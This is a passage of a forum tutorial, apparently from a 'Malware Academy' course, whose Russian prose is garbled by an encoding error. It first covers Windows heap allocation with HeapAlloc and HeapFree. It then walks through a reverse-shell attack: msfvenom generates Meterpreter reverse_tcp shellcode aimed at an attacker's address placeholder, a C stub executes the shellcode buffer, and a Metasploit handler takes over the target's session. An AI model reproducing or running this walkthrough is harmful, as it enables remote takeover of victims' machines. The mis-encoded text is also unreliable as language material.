–§—É–Ω–∫—Ü–∏–∏ –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–æ—Å—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª–µ–º –Ω–∞ –Ω–∞—á–∞–ª–æ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –±–ª–æ–∫–∞ –ø–∞–º—è—Ç–∏. –ò—Å–ø–æ–ª—å–∑—É—è –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–µ –≤—ã—à–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã, pAddress –±—É–¥–µ—Ç –±–∞–∑–æ–≤—ã–º –∞–¥—Ä–µ—Å–æ–º –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –±–ª–æ–∫–∞ –ø–∞–º—è—Ç–∏. –ò—Å–ø–æ–ª—å–∑—É—è —ç—Ç–æ—Ç —É–∫–∞–∑–∞—Ç–µ–ª—å, –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –¥–µ–π—Å—Ç–≤–∏–π, —Ç–∞–∫–∏—Ö –∫–∞–∫ —á—Ç–µ–Ω–∏–µ, –∑–∞–ø–∏—Å—å –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ. –¢–∏–ø—ã –¥–µ–π—Å—Ç–≤–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω—ã, –±—É–¥—É—Ç –∑–∞–≤–∏—Å–µ—Ç—å –æ—Ç –∑–∞—â–∏—Ç—ã, –Ω–∞–∑–Ω–∞—á–µ–Ω–Ω–æ–π –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–º—É —Ä–µ–≥–∏–æ–Ω—É –ø–∞–º—è—Ç–∏.<br />
<br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω –æ–±—Ä–∞–∑–µ—Ü —Ç–æ–≥–æ, –∫–∞–∫ –≤—ã–≥–ª—è–¥–∏—Ç pAddress –≤ –æ—Ç–ª–∞–¥—á–∏–∫–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709169357.png"
		data-src="https://osint42.org/attachments/1746709169357-png.33/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709169357-png.33/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709169357.png"
			title="1746709169357.png"
			width="837" height="289" loading="lazy" />
	</div><br />
<br />
–ö–æ–≥–¥–∞ –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∞, –æ–Ω–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –ª–∏–±–æ –∑–∞–ø–æ–ª–Ω–µ–Ω–∞ –Ω—É–ª—è–º–∏, –ª–∏–±–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å–ª—É—á–∞–π–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. –ù–µ–∫–æ—Ç–æ—Ä—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—é—Ç –æ–ø—Ü–∏—é –æ–±–Ω—É–ª–µ–Ω–∏—è —Ä–µ–≥–∏–æ–Ω–∞ –ø–∞–º—è—Ç–∏ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –≤—ã–¥–µ–ª–µ–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709175008.png"
		data-src="https://osint42.org/attachments/1746709175008-png.34/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709175008-png.34/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709175008.png"
			title="1746709175008.png"
			width="836" height="323" loading="lazy" />
	</div><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º –ø–æ—Å–ª–µ –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –æ–±—ã—á–Ω–æ —è–≤–ª—è–µ—Ç—Å—è –∑–∞–ø–∏—Å—å –≤ —ç—Ç–æ—Ç –±—É—Ñ–µ—Ä. –î–ª—è –∑–∞–ø–∏—Å–∏ –≤ –ø–∞–º—è—Ç—å –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ñ—É–Ω–∫—Ü–∏–π, –Ω–æ –≤ —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è memcpy.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>PVOID pAddress = HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, 100);
CHAR* cString = &quot;Malware Academy Is The Best&quot;;

memcpy (pAddress, cString, strlen(cString));</code></pre>
	</div>
</div><br />
HeapAlloc –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ–ª–∞–≥ HEAP_ZERO_MEMORY, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏ –Ω—É–ª—è–º–∏. –ó–∞—Ç–µ–º —Å—Ç—Ä–æ–∫–∞ –∫–æ–ø–∏—Ä—É–µ—Ç—Å—è –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω—É—é –ø–∞–º—è—Ç—å —Å –ø–æ–º–æ—â—å—é memcpy. –ü–æ—Å–ª–µ–¥–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä –≤ memcpy - —ç—Ç–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–π—Ç–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709189794.png"
		data-src="https://osint42.org/attachments/1746709189794-png.35/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709189794-png.35/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709189794.png"
			title="1746709189794.png"
			width="839" height="399" loading="lazy" />
	</div><br />
<br />
<b>–û—Ç–º–µ—á—É —á—Ç–æ —É–∫–∞–∑–∞–Ω–Ω—ã–π –ø—Ä–∏–º–µ—Ä –Ω–µ –±–µ–∑–æ–ø–∞—Å–µ–Ω, —Ç.–∫. strlen –Ω–µ —É—á–∏—Ç—ã–≤–∞–µ—Ç –Ω—É–ª–µ–≤–æ–π —Å–∏–º–≤–æ–ª –≤ –∫–æ–Ω—Ü–µ, –ª—É—á—à–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–ø–µ—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å–æ —Å—Ç—Ä–æ–∫–∞–º–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä strcpy.<br />
–ù–æ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —Ä–∞–±–æ—Ç—ã —Å –ø–∞–º—è—Ç—å—é, –ø—Ä–∏–º–µ—Ä —Å–æ–π–¥–µ—Ç.)</b><br />
<br />
–ö–æ–≥–¥–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—é –±–æ–ª—å—à–µ –Ω–µ –Ω—É–∂–µ–Ω –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä, –Ω–∞—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –æ—Å–≤–æ–±–æ–¥–∏—Ç—å –±—É—Ñ–µ—Ä, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å —É—Ç–µ—á–µ–∫ –ø–∞–º—è—Ç–∏. –í –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–æ–≥–æ, –∫–∞–∫–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∞—Å—å –¥–ª—è –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏, —É –Ω–µ–µ –±—É–¥–µ—Ç —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è –ø–∞–º—è—Ç–∏. –ù–∞–ø—Ä–∏–º–µ—Ä:<br />
<ul>
<li data-xf-list-type="ul">–ü—Ä–∏ –≤—ã–¥–µ–ª–µ–Ω–∏–∏ –ø–∞–º—è—Ç–∏ —Å –ø–æ–º–æ—â—å—é malloc —Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ free.</li>
<li data-xf-list-type="ul">–ü—Ä–∏ –≤—ã–¥–µ–ª–µ–Ω–∏–∏ –ø–∞–º—è—Ç–∏ —Å –ø–æ–º–æ—â—å—é HeapAlloc —Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ HeapFree.</li>
<li data-xf-list-type="ul">–ü—Ä–∏ –≤—ã–¥–µ–ª–µ–Ω–∏–∏ –ø–∞–º—è—Ç–∏ —Å –ø–æ–º–æ—â—å—é LocalAlloc —Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ LocalFree.</li>
</ul>–ù–∞ —Ä–∏—Å—É–Ω–∫–∞—Ö –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–æ –¥–µ–π—Å—Ç–≤–∏–µ HeapFree, –æ—Å–≤–æ–±–æ–∂–¥–∞—é—â–µ–µ –≤—ã–¥–µ–ª–µ–Ω–Ω—É—é –ø–∞–º—è—Ç—å –ø–æ –∞–¥—Ä–µ—Å—É 000002320E449900. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –∞–¥—Ä–µ—Å 000002320E449900 –ø–æ-–ø—Ä–µ–∂–Ω–µ–º—É —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ, –Ω–æ –µ–≥–æ –∏—Å—Ö–æ–¥–Ω–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—ã–ª–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ —Å–ª—É—á–∞–π–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏. –≠—Ç–∏ –Ω–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, —Å–≤—è–∑–∞–Ω—ã —Å –Ω–æ–≤—ã–º –≤—ã–¥–µ–ª–µ–Ω–∏–µ–º, –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã–º –û–° –≤–Ω—É—Ç—Ä–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709199557.png"
		data-src="https://osint42.org/attachments/1746709199557-png.36/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709199557-png.36/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709199557.png"
			title="1746709199557.png"
			width="835" height="496" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709205577.png"
		data-src="https://osint42.org/attachments/1746709205577-png.37/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709205577-png.37/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709205577.png"
			title="1746709205577.png"
			width="842" height="491" loading="lazy" />
	</div><br />
<br />
–¢–∞–∫–∂–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –ø–æ—Å–ª–µ –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—é nullptr, —á—Ç–æ-–±—ã –Ω–µ –±—ã–ª–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–π –∞–¥—Ä–µ—Å –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ.)<br />
<br />
–í —Å–ª–µ–¥—É—é—â–µ–π —á–∞—Å—Ç–∏ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º —Ä–∞–±–æ—Ç—É —Å Windows API.</div>
						

							<h2>–ß—Ç–æ —Ç–∞–∫–æ–µ payload –∏ shell code</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746731451731.png"
		data-src="https://osint42.org/attachments/1746731451731-png.42/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731451731-png.42/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731451731.png"
			title="1746731451731.png"
			width="1024" height="640" loading="lazy" />
	</div><br />
<br />
<b>–ß—Ç–æ —Ç–∞–∫–æ–µ —à–µ–ª–ª-–∫–æ–¥?</b><br />
<br />
–®–µ–ª–ª-–∫–æ–¥ (–û–Ω-–∂–µ Payload) ‚Äì —ç—Ç–æ –Ω–∞–±–æ—Ä –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –º–∞—à–∏–Ω–Ω–æ–≥–æ –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω –ø—Ä–∏ –≤–Ω–µ–¥—Ä–µ–Ω–∏–∏ –≤ –¥—Ä—É–≥–æ–π –ø—Ä–æ—Ü–µ—Å—Å. –û–Ω —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ —ç–∫—Å–ø–ª–æ–π—Ç–∞—Ö –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–æ–ª—è –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π.<br />
<br />
<b>–ï—Å—Ç—å —Å–ø–æ—Å–æ–±—ã –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –ø—Ä–æ—Å—Ç–µ–Ω—å–∫–∏—Ö —à–µ–ª–ª-–∫–æ–¥–æ–≤:</b><br />
<br />
–°–æ–∑–¥–∞–Ω–∏–µ –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —à–µ–ª–ª–∫–æ–¥–∞ –ø—Ä–∏ –ø–æ–º–æ—â–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤, —Ç–∞–∫–∏—Ö –∫–∞–∫ msvenom –∏ Metasploit, –¥–æ–≤–æ–ª—å–Ω–æ –ø–æ–ø—É–ª—è—Ä–Ω–æ —Å—Ä–µ–¥–∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –ø–µ–Ω—Ç–µ—Å—Ç–µ—Ä–æ–≤. –î–∞–≤–∞–π—Ç–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º, –∫–∞–∫ —Å–æ–∑–¥–∞—Ç—å —à–µ–ª–ª–∫–æ–¥ –∏ –≤–Ω–µ–¥—Ä–∏—Ç—å –µ–≥–æ –≤ –ø—Ä–æ–≥—Ä–∞–º–º—É –Ω–∞ —è–∑—ã–∫–µ –°.<br />
<br />
<b>–®–∞–≥ 1: –°–æ–∑–¥–∞–Ω–∏–µ —à–µ–ª–ª–∫–æ–¥–∞ —Å –ø–æ–º–æ—â—å—é msvenom</b><br />
<br />
msvenom - —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, –≤—Ö–æ–¥—è—â–∏–π –≤ —Å–æ—Å—Ç–∞–≤ Metasploit Framework, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–æ–∑–¥–∞–≤–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –≤–∏–¥—ã –ø–µ–π–ª–æ–∞–¥–æ–≤.<br />
<br />
–ë–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –¥–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤–æ–≤ Linux –ø–æ–∑–≤–æ–ª—è—é—Ç –ª–µ–≥–∫–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å Metasploit. –ü—Ä–∏–º–µ—Ä —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–∞ Kali Linux –∏–ª–∏ Debian:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>sudo apt-get update
sudo apt-get install metasploit-framework</code></pre>
	</div>
</div><br />
–ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ –∑–∞–ø—É—Å–∫–∞ msvenom, –≤—ã –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –¥–æ—Å—Ç—É–ø–Ω—ã–µ –æ–ø—Ü–∏–∏ –∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msvenom --help</code></pre>
	</div>
</div><br />
–•–æ—Ç—è Metasploit –∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–µ–Ω–Ω–æ –¥–ª—è Linux, –µ—Å—Ç—å –≤–µ—Ä—Å–∏—è –¥–ª—è Windows, –Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω–µ–µ —Ç—Ä–∏–≤–∏–∞–ª—å–Ω–æ–π. –†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤–∏—Ä—Ç—É–∞–ª—å–Ω—É—é –º–∞—à–∏–Ω—É —Å Linux (–Ω–∞–ø—Ä–∏–º–µ—Ä, Kali Linux) –Ω–∞ –≤–∞—à–µ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ –ø–æ–¥ Windows –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å Metasploit.<br />
<br />
–ò—Ç–∞–∫, –¥–æ–ø—É—Å—Ç–∏–º, –≤—ã —Ö–æ—Ç–∏—Ç–µ —Å–æ–∑–¥–∞—Ç—å –æ–±—Ä–∞—Ç–Ω–æ–µ TCP-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ (reverse shell) –æ—Ç —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω—ã –∫ –≤–∞—à–µ–π –º–∞—à–∏–Ω–µ. –í—ã –º–æ–∂–µ—Ç–µ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —à–µ–ª–ª–∫–æ–¥ —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>msvenom -p windows/meterpreter/reverse_tcp LHOST=–≤–∞—à_–∏–ø LPORT=4444 -f c</code></pre>
	</div>
</div><br />
–≠—Ç–æ —Å–æ–∑–¥–∞—Å—Ç C-–ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ —à–µ–ª–ª–∫–æ–¥–∞, –≥–¥–µ LHOST - —ç—Ç–æ IP-–∞–¥—Ä–µ—Å –≤–∞—à–µ–π –º–∞—à–∏–Ω—ã, –∞ LPORT - –ø–æ—Ä—Ç, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ö–æ—Ç–∏—Ç–µ, —á—Ç–æ–±—ã —Ü–µ–ª–µ–≤–∞—è –º–∞—à–∏–Ω–∞ –ø–æ–¥–∫–ª—é—á–∏–ª–∞—Å—å.<br />
<br />
<b>–®–∞–≥ 2: –í–Ω–µ–¥—Ä–µ–Ω–∏–µ —à–µ–ª–ª–∫–æ–¥–∞ –≤ –ø—Ä–æ–≥—Ä–∞–º–º—É –Ω–∞ –°</b><br />
<br />
–ü–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è —à–µ–ª–ª–∫–æ–¥–∞ —Å –ø–æ–º–æ—â—å—é msvenom, –≤–∞–º –±—É–¥–µ—Ç –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω –∫–æ–¥ –Ω–∞ —è–∑—ã–∫–µ C, –∫–æ—Ç–æ—Ä—ã–π –≤—ã –º–æ–∂–µ—Ç–µ —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ –≤–∞—à–µ–π –ø—Ä–æ–≥—Ä–∞–º–º–µ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>unsigned char buf[] =
&quot;\x00\x00\x00...&quot;; // –∑–¥–µ—Å—å –±—É–¥–µ—Ç –≤–∞—à —à–µ–ª–ª–∫–æ–¥

int main(int argc, char **argv) {
    void (*func)();
    func = (void (*)()) buf;
    func();
    return 0;
}</code></pre>
	</div>
</div><br />
<b>–®–∞–≥ 3: –û–∂–∏–¥–∞–Ω–∏–µ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</b><br />
<br />
–ó–∞–ø—É—Å—Ç–∏—Ç–µ Metasploit –∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–æ–¥—Ö–æ–¥—è—â–∏–π exploit/multi/handler –¥–ª—è –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST –≤–∞—à_–∏–ø
set LPORT 4444
run</code></pre>
	</div>
</div><br />
–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ –≤—ã –∑–∞–ø—É—Å—Ç–∏—Ç–µ —Å–≤–æ—é –ø—Ä–æ–≥—Ä–∞–º–º—É –Ω–∞ –°–∏, –æ–Ω–∞ —Å–æ–∑–¥–∞—Å—Ç –æ–±—Ä–∞—Ç–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∫ –≤–∞—à–µ–º—É Metasploit, –∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ meterpreter –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ.<br />
<br />
–ü–æ—Å–ª–µ —Ç–æ–≥–æ –∫–∞–∫ —Ü–µ–ª–µ–≤–∞—è –º–∞—à–∏–Ω–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç—Å—è, –≤—ã —É–≤–∏–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Å–µ—Å—Å–∏–∏. –í—ã –º–æ–∂–µ—Ç–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å —ç—Ç–æ–π —Å–µ—Å—Å–∏–µ–π –∏—Å–ø–æ–ª—å–∑—É—è:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>sessions -i –Ω–æ–º–µ—Ä_—Å–µ—Å—Å–∏–∏</code></pre>
	</div>
</div><br />
–ù–∞–ø—Ä–∏–º–µ—Ä:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>sessions -i 1</code></pre>
	</div>
</div><br />
–¢–µ–ø–µ—Ä—å –≤—ã –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ Meterpreter –∏ –º–æ–∂–µ—Ç–µ –≤—ã–ø–æ–ª–Ω—è—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã.<br />
<br />
